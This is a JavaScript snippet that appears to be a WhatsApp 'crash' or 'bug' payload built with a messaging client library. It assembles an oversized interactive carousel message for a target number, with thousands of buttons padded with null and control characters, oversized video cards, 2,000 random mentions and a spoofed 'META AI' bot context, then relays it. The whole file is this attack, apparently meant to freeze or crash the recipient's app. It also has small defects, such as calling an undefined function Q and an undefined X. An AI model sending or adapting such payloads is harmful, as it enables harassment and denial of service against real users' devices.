async function Qlay(sock, target) {
 const baten = [
 { name: "single_select", buttonParamsJson: "" }
 ];

 for (let i = 0; i < 1000; i++) {
 baten.push(
 { name: "cta_call", buttonParamsJson: JSON.stringify({ status: true }) },
 { name: "cta_copy", buttonParamsJson: JSON.stringify({ display_text: "\u0000".repeat(5000) }) },
 { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "\x10".repeat(5000) }) }
 );
 }
  const cardTemplate = {
    header: {
      videoMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/26969734_696671580023189_3150099807015053794_n.enc?ccb=11-4&oh=01_Q5Aa1wH_vu6G5kNkZlean1BpaWCXiq7Yhen6W-wkcNEPnSbvHw&oe=6886DE85&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "sHsVF8wMbs/aI6GB8xhiZF1NiKQOgB2GaM5O0/NuAII=",
        fileLength: { low: 4194304, high: 2560, unsigned: true },
        seconds: 999999999,
        mediaKey: "EneIl9K1B0/ym3eD0pbqriq+8K7dHMU9kkonkKgPs/8=",
        height: 9999,
        width: 9999,
        fileEncSha256: "KcHu146RNJ6FP2KHnZ5iI1UOLhew1XC5KEjMKDeZr8I=",
        directPath:
          "/v/t62.7161-24/26969734_696671580023189_3150099807015053794_n.enc?ccb=11-4&oh=01_Q5Aa1wH_vu6G5kNkZlean1BpaWCXiq7Yhen6W-wkcNEPnSbvHw&oe=6886DE85&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1751081957"
      },
      hasMediaAttachment: true,
    },
    body: {
      text: "𐌼𐌀CK3FELL𐌀𐍂",
    },
    nativeFlowMessage: {
      buttons: baten,
    },
  };

  const msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "𐌼𐌀CK3FELL𐌀𐍂",
            },
            carouselMessage: {
              cards: Array(10).fill(cardTemplate),
              messageVersion: 1,
            },
            contextInfo: {
 participant: X,
 mentionedJid: [
 "0@s.whatsapp.net",
 ...Array.from(
 { length: 2000 },
 () =>
 "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
 ),
 ],
 remoteJid: "X",
 participant: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
 stanzaId: "123",
 quotedMessage: {
 paymentInviteMessage: {
 serviceType: 3,
 expiryTimestamp: Date.now() + 1814400000
 },
 forwardedAiBotMessageInfo: {
 botName: "META AI",
 botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
 creatorName: "Bot"
 },
 },
 },
            },
          },
        },
      },
    },
    {}
  );
  console.log("Message sent successfully!");
  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id,
  });
}

for (let x = 0; x < 1; x++) {
 await Q(client, target);
 await new Promise(res => setTimeout(res, 500));
}